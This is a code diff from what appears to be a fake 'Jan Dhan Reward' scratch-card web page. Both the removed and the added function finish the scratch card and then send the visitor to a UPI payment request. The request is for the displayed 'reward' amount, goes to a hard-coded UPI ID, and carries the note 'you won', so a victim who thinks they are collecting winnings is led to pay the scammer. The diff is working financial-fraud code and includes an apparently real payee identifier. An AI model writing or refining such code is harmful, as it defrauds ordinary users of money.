@@ -226,32 +226,32 @@
             return match ? match[0] : '1496';
         }
 
-        function redirectToPhonePe() {
-            const amount = getRewardAmount();
-            const upi = '8271514079-1@nyes';
-            const description = 'you won';
-            
-            // PhonePe UPI deep link
-            const phonepeUrl = `upi://pay?pa=${upi}&pn=Jan%20Dhan%20Reward&am=${amount}&cu=INR&tn=${encodeURIComponent(description)}`;
-            
-            // Web fallback
-            const webUrl = `https://phon.pe/${upi}?amount=${amount}&description=${encodeURIComponent(description)}`;
-            
-            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-            
-            if (isMobile) {
-                // Try to open PhonePe app
-                window.location.href = phonepeUrl;
-                
-                // If app doesn't open, fallback to web after 1.5 seconds
-                setTimeout(() => {
-                    window.location.href = webUrl;
-                }, 1500);
-            } else {
-                // Desktop - open web version
-                window.location.href = webUrl;
-            }
-        }
+        function autoCompleteScratch() {
+    ctx.globalCompositeOperation = 'destination-out';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    launchLightCelebration();
+
+    // 2.5 second baad PhonePe/UPI open
+    setTimeout(() => {
+
+        // Reward amount (₹1496 -> 1496)
+        const amount = document.getElementById("amount")
+            .textContent
+            .replace(/[^\d.]/g, "");
+
+        // UPI Deep Link
+        const upiUrl =
+            `upi://pay?pa=8271514079-1@nyes` +
+            `&pn=Reward` +
+            `&am=${amount}` +
+            `&cu=INR` +
+            `&tn=${encodeURIComponent("you won")}`;
+
+        // Open PhonePe / Default UPI App
+        window.location.href = upiUrl;
+
+    }, 2500);
+}
 
         function scratch(x, y) {
             if (isCompleted) return;
